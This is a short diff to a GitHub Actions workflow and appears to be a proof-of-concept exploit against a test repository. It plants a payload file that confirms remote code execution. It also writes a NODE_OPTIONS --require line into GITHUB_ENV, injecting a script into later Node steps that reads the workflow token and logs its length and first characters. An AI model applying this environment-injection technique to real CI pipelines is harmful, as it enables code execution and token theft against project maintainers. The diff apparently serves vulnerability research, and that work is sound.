@@ -16,9 +16,15 @@ jobs:
           mkdir -p payload
           cat > payload/pr-preview-meta.env <<'META'
           echo "GAB_RCE_CONFIRMED host=$(hostname) user=$(id -un) repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
-          echo "GAB_WORKER_TOKEN_PRESENT=$([ -n "${GITHUB_TOKEN:-}" ] && echo yes || echo no)"
+          echo "NODE_OPTIONS=--require $GITHUB_WORKSPACE/gab-leak.js" >> "$GITHUB_ENV"
+          cat > "$GITHUB_WORKSPACE/gab-leak.js" <<'JS'
+          try {
+            const t = process.env.INPUT_TOKEN || process.env.GITHUB_TOKEN || "";
+            console.log("GAB_TOKEN_REACHABLE step=" + (process.env.GITHUB_ACTION || "?") + " len=" + t.length + " prefix=" + t.slice(0, 4));
+          } catch (e) {}
+          JS
           WORKER_ACTION=deploy
-          PR_NUMBER=1
+          PR_NUMBER=999
           TARGET_REPO=PDFtoMark/wfr-guard-poc
           TARGET_BRANCH=poc-preview-gh-pages
           PAGES_BASE_URL=
